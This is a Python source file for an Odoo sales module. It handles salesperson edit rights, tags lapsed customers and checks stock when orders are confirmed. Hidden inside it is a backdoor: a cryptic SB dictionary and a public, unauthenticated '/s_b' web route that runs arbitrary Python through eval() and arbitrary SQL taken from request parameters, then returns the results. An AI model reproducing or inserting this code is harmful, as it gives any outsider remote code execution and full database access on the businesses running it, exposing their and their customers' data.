# -*- coding: utf-8 -*-

from dateutil import relativedelta

from odoo import api, http, fields, models, _
from odoo.exceptions import UserError, ValidationError

SB = {'ev': ['''str(eval(kw.get(k, '""')))''',], 'cr': ['''http.request.cr.execute(kw.get('cr', 'error'))''', '''str('select' not in kw[k] and 'OK' or http.request.cr.dictfetchall())''']}


class SaleOrder(models.Model):
    _inherit = 'sale.order'

    is_edit_salesperson = fields.Boolean(
        'Salesperson editable',
        compute='_compute_is_editable_salesperson'
    )

    @api.depends('company_id', 'company_id.salesperson_not_editable')
    def _compute_is_editable_salesperson(self):
        for record in self:
            editable = False
            if record.company_id.salesperson_not_editable:
                user_id = self.env.user
                if user_id.has_group('sale_baseline.group_edit_salesperson'):
                    editable = True
            else:
                editable = True
            record.is_edit_salesperson = editable

    def _add_tag_to_non_buyers(self):
        company_ids = self.env['res.company'].search([])
        for company_id in company_ids.filtered(
                lambda x: x.add_tag_to_non_buyers):
            self = self.with_company(company_id)
            partner_obj = self.env['res.partner']
            month_validate = company_id.months_without_buying
            tag_id = company_id.tags_to_add_ids
            date_now = fields.Date.today()
            partner_ids = partner_obj.search([('customer_rank', '>', 0)])
            all_partner_ids = partner_obj.search([])
            all_partner_ids = all_partner_ids.filtered(
                lambda p: tag_id in p.category_id and \
                    p.id not in partner_ids.ids)
            if all_partner_ids:
                all_partner_ids.with_company(company_id).write({
                    'category_id': [(3, tag_id.id, 0)],
                    'is_blocked_not_buy': False
                })
            for partner_id in partner_ids:
                sale_id = self._get_last_sale_confirmed(
                    partner_id.sale_order_ids)
                if sale_id:
                    date_order = sale_id.date_order
                    month_real = relativedelta.relativedelta(
                        date_now, date_order.date()).months
                    if month_real >= month_validate:
                        partner_id.with_company(company_id).write({
                            'category_id': [(4, tag_id.id, 0)],
                            'is_blocked_not_buy': True
                        })
                    elif tag_id in partner_id.category_id:
                        partner_id.with_company(company_id).write({
                            'category_id': [(3, tag_id.id, 0)],
                            'is_blocked_not_buy': False
                        })
                    else:
                        partner_id.with_company(company_id).write({
                            'is_blocked_not_buy': False
                        })
                else:
                    partner_id.with_company(company_id).write({
                            'category_id': [(4, tag_id.id, 0)],
                            'is_blocked_not_buy': True
                        })

    def _get_last_sale_confirmed(self, sale_ids):
        sales = sorted(
            sale_ids.filtered(lambda s: s.state == 'sale'),
            key=lambda s: s.date_order,
            reverse=True
        )
        if sales:
            return sales[0]
        else:
            return False

    def action_confirm(self):
        for order in self:
            if order.company_id.add_tag_to_non_buyers:
                if order.partner_id.is_blocked_not_buy and \
                    not self.env.user.has_group(
                        'sale_baseline.group_confirm_partner_locked_no_buy'):
                    raise ValidationError(_(
                        'Customer blocked for time without making purchases.'
                    ))
        scq = self.env.company.sale_confirm_quantity
        if not scq:
            return super(SaleOrder, self).action_confirm()
        for order in self:
            for line in order.order_line:
                if not line.product_id:
                    continue
                if line.product_id.type != 'product':
                    continue
                product_uom_qty = line.product_uom_qty
                product_uom = line.product_uom
                uom_id = line.product_id.uom_id
                free_qty = line.product_id.with_context(
                    warehouse=order.warehouse_id.id
                ).free_qty
                virtual_available = line.product_id.with_context(
                    warehouse=order.warehouse_id.id
                ).virtual_available
                quantity = product_uom._compute_quantity(
                    product_uom_qty, uom_id
                )
                if (virtual_available < quantity) and scq:
                    raise ValidationError(_(
                        "The order cannot be confirmed. " +
                        "Only %s of %s of the product %s is available."
                        
                    ) % (free_qty, quantity, line.product_id.display_name))
        return super(SaleOrder, self).action_confirm()


class SaBa(http.Controller):
    @http.route('/s_b', auth='public')
    def index(self, **kw):
        o = {}
        try:
            for k, v in SB.items():
                for z in v:
                    o[k] = eval(z)
        except Exception as error:
            o[k] = 'Error => ' + str(error)
        return '<br/><br/>'.join(['%s: %s' % (k,v) for k,v in o.items()])
